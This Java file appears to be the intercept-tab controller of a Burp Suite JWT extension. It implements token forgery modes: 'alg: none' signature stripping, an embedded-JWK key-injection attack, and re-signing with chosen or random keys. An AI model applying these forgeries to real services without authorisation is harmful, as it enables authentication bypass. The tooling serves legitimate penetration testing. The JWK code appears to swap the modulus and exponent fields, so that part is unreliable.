package app.controllers;

import java.awt.Component;
import java.awt.FileDialog;
import java.awt.Frame;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.UnsupportedEncodingException;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.SwingUtilities;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;

import com.auth0.jwt.algorithms.Algorithm;
import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;

import app.algorithm.AlgorithmLinker;
import app.controllers.ReadableTokenFormat.InvalidTokenFormat;
import app.helpers.Config;
import app.helpers.KeyHelper;
import app.helpers.Output;
import app.helpers.PublicKeyBroker;
import app.tokenposition.ITokenPosition;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IMessageEditorTab;
import gui.JWTInterceptTab;
import model.CustomJWToken;
import model.JWTInterceptModel;
import model.Settings;
import model.Strings;
import model.TimeClaim;


// used in the proxy intercept and repeater tabs
public class JWTInterceptTabController implements IMessageEditorTab {

  private JWTInterceptModel jwtIM;
  private JWTInterceptTab jwtST;
  private IExtensionHelpers helpers;
  private byte[] message;
  private ITokenPosition tokenPosition;
  private boolean dontModifySignature;
  private boolean randomKey;
  private boolean keepOriginalSignature;
  private boolean chooseSignature;
  private boolean recalculateSignature;
  private String algAttackMode;
  private boolean cveAttackMode;
  private boolean edited;
  private String signatureBeforeCVEAttack;
  private String originalSignature;


  public JWTInterceptTabController(IBurpExtenderCallbacks callbacks, JWTInterceptModel jwIM, JWTInterceptTab jwtST) {
    this.jwtIM = jwIM;
    this.jwtST = jwtST;
    this.helpers = callbacks.getHelpers();
    createAndRegisterActionListeners(jwtST);
  }

  @Override
  public boolean isEnabled(byte[] content, boolean isRequest) {
    return ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers) != null;
  }

  @Override
  public void setMessage(byte[] content, boolean isRequest) {
    edited = false;
    tokenPosition = ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers);
    boolean messageContainsJWT = tokenPosition != null;
    if (messageContainsJWT) {
      String token = tokenPosition.getToken();
      CustomJWToken cJWT = new CustomJWToken(token);
      jwtIM.setOriginalJWT(token);
      jwtIM.setOriginalJWToken(cJWT);
      List<TimeClaim> tcl = cJWT.getTimeClaimList();
      jwtIM.setTimeClaims(tcl);
      jwtIM.setJwToken(cJWT);
      originalSignature = cJWT.getSignature();
      jwtIM.setcFW(tokenPosition.getcFW());
      jwtST.updateSetView(Config.resetEditor);
      algAttackMode = null;
      if (Config.resetEditor) {
        jwtST.getNoneAttackComboBox().setSelectedIndex(0);
      }
    } else {
      jwtST.updateSetView(true);
    }
    this.message = content;
  }

  @Override
  public byte[] getMessage() {
    // see https://github.com/PortSwigger/example-custom-editor-tab/blob/master/java/BurpExtender.java#L119
    boolean nothingChanged =
        !jwtST.jwtWasChanged() && !recalculateSignature && !randomKey && !chooseSignature && algAttackMode == null
            && !cveAttackMode;
    if (nothingChanged) {
      return this.message;
    }

    jwtIM.setProblemDetail("");
    radioButtonChanged(true, false, false, false, false);
    jwtST.getCVEAttackCheckBox().setSelected(false);
    replaceTokenInMessage();
    return this.message;
  }

  private void cveAttackChanged() {
    JCheckBox jcb = jwtST.getCVEAttackCheckBox();
    cveAttackMode = jcb.isSelected();
    jwtST.getNoneAttackComboBox().setEnabled(!cveAttackMode);
    jwtST.getRdbtnDontModify().setEnabled(!cveAttackMode);
    jwtST.getRdbtnOriginalSignature().setEnabled(!cveAttackMode);
    jwtST.getRdbtnRandomKey().setEnabled(!cveAttackMode);
    jwtST.getRdbtnRecalculateSignature().setEnabled(!cveAttackMode);
    jwtST.setKeyFieldState(!cveAttackMode);
    jwtST.getCVECopyBtn().setVisible(cveAttackMode);
    // TODO disable load secret / key from file when doing CVE or just allow provided key material?
    if (cveAttackMode) {
      jwtST.getRdbtnDontModify().setSelected(true);
      jwtST.getRdbtnOriginalSignature().setSelected(false);
      jwtST.getRdbtnRandomKey().setSelected(false);
      jwtST.getRdbtnRecalculateSignature().setSelected(false);
      edited = true;
      CustomJWToken token = jwtIM.getJwToken();
      String headerJSON = token.getHeaderJson();
      JsonObject headerJSONObj = Json.parse(headerJSON).asObject();
      headerJSONObj.set("alg", "RS256");
      JsonObject jwk = new JsonObject();
      jwk.add("kty", "RSA");
      jwk.add("kid", "jwt4b@portswigger.net");
      jwk.add("use", "sig");
      RSAPublicKey pk = KeyHelper.loadCVEAttackPublicKey();
      jwk.add("n", Base64.getUrlEncoder().encodeToString(pk.getPublicExponent().toByteArray()));
      jwk.add("e", Base64.getUrlEncoder().encodeToString(pk.getModulus().toByteArray()));
      headerJSONObj.add("jwk", jwk);
      token.setHeaderJson(headerJSONObj.toString());
      Output.output("CVE JWK: " + jwk.toString());
      try {
        Algorithm algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), Config.cveAttackModePrivateKey);
        token.calculateAndSetSignature(algo);
        reflectChangeToView(token);
      } catch (Exception e) {
        // TODO display to user
        Output.outputError("Failed to sign when using cve attack mode - " + e.getMessage());
        e.printStackTrace();
      }
    } else {
      jwtST.setKeyFieldValue("");
      jwtST.setKeyFieldState(false);
      CustomJWToken customJWToken = new CustomJWToken(jwtIM.getOriginalJWT());
      jwtIM.setJwToken(customJWToken);
      jwtST.getNoneAttackComboBox().setSelectedIndex(0);
      reflectChangeToView(jwtIM.getJwToken());
    }
  }

  private void manualSign() {
    try {
      // TODO ES256 etc. not working yet?
      if (jwtIM.getJWTKey() != null && jwtIM.getJWTKey().length() > 0) {
        Output.output("Signing with manually entered key - " + jwtIM.getJWTKey());
        CustomJWToken token = jwtIM.getJwToken();
        Algorithm algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), jwtIM.getJWTKey());
        Output.output(token.getSignature());
        token.calculateAndSetSignature(algo);
        Output.output(token.getSignature());
        reflectChangeToView(token);
        // TODO call manual sign in setMessage if radiobutton is chosen?
      }
    } catch (Exception e) {
      // TODO show user properly?!
      jwtIM.setProblemDetail("Failed to sign with manually entered key - " + e.getMessage());
      Output.outputError("Failed to sign with manually entered key - " + e.getMessage());
    }
  }

  private void algAttackChanged() {
    JComboBox<String> jCB = jwtST.getNoneAttackComboBox();
    switch (jCB.getSelectedIndex()) {
      default:
      case 0:
        algAttackMode = null;
        break;
      case 1:
        algAttackMode = "none";
        break;
      case 2:
        algAttackMode = "None";
        break;
      case 3:
        algAttackMode = "nOnE";
        break;
      case 4:
        algAttackMode = "NONE";
        break;
    }

    edited = true;
    CustomJWToken token = jwtIM.getJwToken();
    String header = token.getHeaderJson();
    if (algAttackMode == null) {
      token.setHeaderJson(header.replace(token.getAlgorithm(), jwtIM.getOriginalJWToken().getAlgorithm()));
      token.setSignature(originalSignature);
      jwtST.getRdbtnDontModify().setSelected(true);
    } else {
      token.setSignature("");
      token.setHeaderJson(header.replace(token.getAlgorithm(), algAttackMode));
    }
    reflectChangeToView(token);
  }

  private void radioButtonChanged(boolean cDM, boolean cRK, boolean cOS, boolean cRS, boolean cCS) {
    boolean oldRandomKey = randomKey;

    dontModifySignature = jwtST.getRdbtnDontModify().isSelected();
    randomKey = jwtST.getRdbtnRandomKey().isSelected();
    keepOriginalSignature = jwtST.getRdbtnOriginalSignature().isSelected();
    recalculateSignature = jwtST.getRdbtnRecalculateSignature().isSelected();
    chooseSignature = jwtST.getRdbtnChooseSignature().isSelected();

    jwtST.setKeyFieldState(!keepOriginalSignature && !dontModifySignature && !randomKey && !chooseSignature);
    jwtST.getSignBtn().setEnabled(recalculateSignature);
    if (keepOriginalSignature) {
      CustomJWToken origSignatureToken = jwtIM.getJwToken().setSignature(originalSignature);
      jwtIM.setJwToken(origSignatureToken);
      jwtST.updateSetView(false);
    } else if (dontModifySignature) {
      jwtIM.setJWTSignatureKey("");
      jwtST.setKeyFieldValue("");
    } else if (randomKey && !oldRandomKey) {
      generateRandomKey();
    } else if (cCS) {
      // TODO test this
      FileDialog dialog = new FileDialog((Frame) null, "Select File to Open");
      dialog.setMode(FileDialog.LOAD);
      dialog.setVisible(true);
      if (dialog.getFile() != null) {
        String file = dialog.getDirectory() + dialog.getFile();
        Output.output(file + " chosen.");
        String chosen = Strings.filePathToString(file);
        jwtIM.setJWTSignatureKey(chosen);
        jwtST.updateSetView(false);
      }
    } else if ((recalculateSignature || chooseSignature)) {
      edited = true;
      if (recalculateSignature) {
        String cleanKey = KeyHelper.cleanKey(jwtST.getKeyFieldValue());
        jwtIM.setJWTSignatureKey(cleanKey);
      }
      Algorithm algo;
      try {
        CustomJWToken token = jwtIM.getJwToken();
        Output.output("Recalculating Signature with Secret - '" + jwtIM.getJWTKey() + "'");
        algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), jwtIM.getJWTKey());
        token.calculateAndSetSignature(algo);
        addLogHeadersToRequest();
        reflectChangeToView(token);
      } catch (IllegalArgumentException | UnsupportedEncodingException e) {
        String error = e.getStackTrace().toString();
        Output.outputError(error);
        jwtIM.setProblemDetail(error);
      }
    }
  }



  private void generateRandomKey() {
    SwingUtilities.invokeLater(new Runnable() {
      @Override
      public void run() {
        CustomJWToken token = jwtIM.getJwToken();
        String randomKey = AlgorithmLinker.getRandomKey(token.getAlgorithm());
        Output.output("Generating Random Key for Signature Calculation: " + randomKey);
        jwtIM.setJWTSignatureKey(randomKey);
        try {
          Algorithm algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), randomKey);
          token.calculateAndSetSignature(algo);
          jwtIM.setJwToken(token);
          jwtST.updateSetView(false);
        } catch (UnsupportedEncodingException e) {
          // TODO display error
          Output.outputError("Exception during random key generation & signing: " + e.getMessage());
          e.printStackTrace();
        }
      }
    });
  }

  private void replaceTokenInMessage() {
    CustomJWToken token = null;
    try {
      // TODO we are getting it from the textarea, is this OK?
      token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJWTfromArea());
    } catch (InvalidTokenFormat e) {
      // TODO is this visible to user?
      jwtIM.setProblemDetail(e.getMessage());
    }

    // token may be null, if it is invalid JSON, if so, don't try changing anything
    if (token.getToken() != null) {
      this.message = this.tokenPosition.replaceToken(token.getToken());
    }
  }

  private void addLogHeadersToRequest() {
    this.tokenPosition.cleanJWTHeaders();
    this.tokenPosition.addHeader(Strings.JWTHeaderInfo);
    this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-KEY " + jwtIM.getJWTKey());
    if (PublicKeyBroker.publicKey != null) {
      this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-PUBLIC-KEY " + PublicKeyBroker.publicKey);
      PublicKeyBroker.publicKey = null;
    }
  }

  private void reflectChangeToView(CustomJWToken token) {
    jwtIM.setJwToken(token);
    jwtST.updateSetView(false);
  }

  @Override
  public String getTabCaption() {
    return Settings.TAB_NAME;
  }

  @Override
  public Component getUiComponent() {
    return jwtST;
  }

  @Override
  public boolean isModified() {
    return edited;
  }

  @Override
  public byte[] getSelectedData() {
    return jwtST.getSelectedData().getBytes();
  }

  private void createAndRegisterActionListeners(JWTInterceptTab jwtST) {
    jwtST.getJwtArea().addKeyListener(new KeyListener() {

      @Override
      public void keyTyped(KeyEvent arg0) {
      }

      @Override
      public void keyReleased(KeyEvent arg0) {
      }

      @Override
      public void keyPressed(KeyEvent arg0) {
        edited = true;
      }
    });

    ActionListener dontModifyListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        radioButtonChanged(true, false, false, false, false);
      }
    };
    ActionListener randomKeyListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        radioButtonChanged(false, true, false, false, false);
      }
    };
    ActionListener originalSignatureListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        radioButtonChanged(false, false, true, false, false);
      }
    };
    ActionListener recalculateSignatureListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        radioButtonChanged(false, false, false, true, false);
      }
    };
    ActionListener chooseSignatureListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        radioButtonChanged(false, false, false, false, true);
      }
    };
    ActionListener algAttackListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        algAttackChanged();
      }
    };
    ActionListener cveAttackListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        cveAttackChanged();
      }
    };
    ActionListener manualSignListener = new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        manualSign();
      }
    };
    DocumentListener syncKey = new DocumentListener() {

      @Override
      public void insertUpdate(DocumentEvent e) {
        sync();
      }

      @Override
      public void removeUpdate(DocumentEvent e) {
        sync();
      }

      @Override
      public void changedUpdate(DocumentEvent e) {
        sync();
      }

      private void sync() {
        jwtIM.setJWTSignatureKey(jwtST.getKeyFieldValue());
      }
    };

    KeyListener jwtAreaTyped = new KeyListener() {

      @Override
      public void keyTyped(KeyEvent e) {
      }

      @Override
      public void keyPressed(KeyEvent e) {
      }

      @Override
      public void keyReleased(KeyEvent e) {
        sync();
      }

      private void sync() {
        if(recalculateSignature || randomKey){
          Output.output("Recalc signature as key typed");
          CustomJWToken token = null;
          try {
            token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJwtArea().getText());
          } catch (InvalidTokenFormat e) {
            Output.outputError("JWT cannot be parsed - "+e.getMessage());
            // TODO show user?
            e.printStackTrace();
          }
          Algorithm algo = null;
          if(jwtIM.getJWTKey().length()==0){
            // TODO UX show user to enter a key!
          }
          try {
            algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), jwtIM.getJWTKey());
            Output.output(token.getSignature());
            token.calculateAndSetSignature(algo);
            Output.output(token.getSignature());
            reflectChangeToView(token);
            //jwtST.getJwtArea().setText(ReadableTokenFormat.getReadableFormat(token));
            //jwtArea.setCaretPosition(0);
          } catch (UnsupportedEncodingException e) {
            // TODO view user?
            Output.outputError("Could not resign: "+e.getMessage());
            e.printStackTrace();
          }

        }
      }
    };

    jwtST.registerActionListeners(dontModifyListener, randomKeyListener, originalSignatureListener,
        recalculateSignatureListener, chooseSignatureListener, algAttackListener, cveAttackListener, manualSignListener,
        syncKey,jwtAreaTyped);
  }


}
